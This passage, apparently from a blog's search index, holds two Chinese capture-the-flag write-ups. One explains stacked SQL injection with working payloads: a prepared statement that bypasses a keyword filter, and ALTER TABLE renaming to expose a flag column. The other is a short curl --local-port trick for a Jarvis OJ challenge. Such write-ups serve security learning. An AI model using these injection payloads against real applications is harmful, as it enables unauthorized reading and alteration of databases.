    <content type="html"><![CDATA[<p>##堆叠注入</p><p>预编译绕过<br>预编译相关语法如下：</p><a id="more"></a><p>set用于设置变量名和值<br>prepare用于预备一个语句，并赋予名称，以后可以引用该语句<br>execute执行语句<br>deallocate prepare用来释放掉预处理的语句</p><p>直接看payload就懂了：</p><p>-1’;set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#</p><p>拆分开来如下<br>-1’;<br>set @sql = CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);<br>prepare stmt from @sql;<br>EXECUTE stmt;</p><p>我们将表1919810931114514名字改为words，flag列名字改为id，那么就能得到flag的内容了。</p><p>修改表名和列名的语法如下：</p><p>修改表名(将表名user改为users)<br>alter table user rename to users;</p><p>修改列名(将字段名username改为name)<br>alter table users change uesrname name varchar(30);</p><p>最终payload如下：</p><p>1’; alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p><p>拆分开来如下<br>1’;<br>alter table words rename to words1;<br>alter table <code>1919810931114514</code> rename to words;<br>alter table words change flag id varchar(50);</p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ port 51</title>
    <link href="/2019/12/21/Jarvis-OJ-port-51/"/>
    <url>/2019/12/21/Jarvis-OJ-port-51/</url>
    
    <content type="html"><![CDATA[<p>题目链接: <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br>访问页面之后，页面显示：</p><p>Please use port 51 to visit this site.</p><p>当时看到了这个还以为是需要访问这个网站的51端口，但是这个网址已经确定了是访问32770端口，后来一直都没有思路。最后才发现是要求本地以51端口去访问这个网址。payload如下：</p><a id="more"></a><blockquote><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p></blockquote><p>最后就可以拿到flag</p><hr><p>curl，全称CommandLine URL 或 CommandLine Uniform Resource Locator，顾名思义，curl命令是在命令行方式下工作，利用URL的语法进行数据的传输或者文件的传输。</p><p><strong>CURL具体用法</strong><br>(<a href="https://itbilu.com/linux/man/4yZ9qH_7X.html" target="_blank" rel="noopener">https://itbilu.com/linux/man/4yZ9qH_7X.html</a>)</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>Jarvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
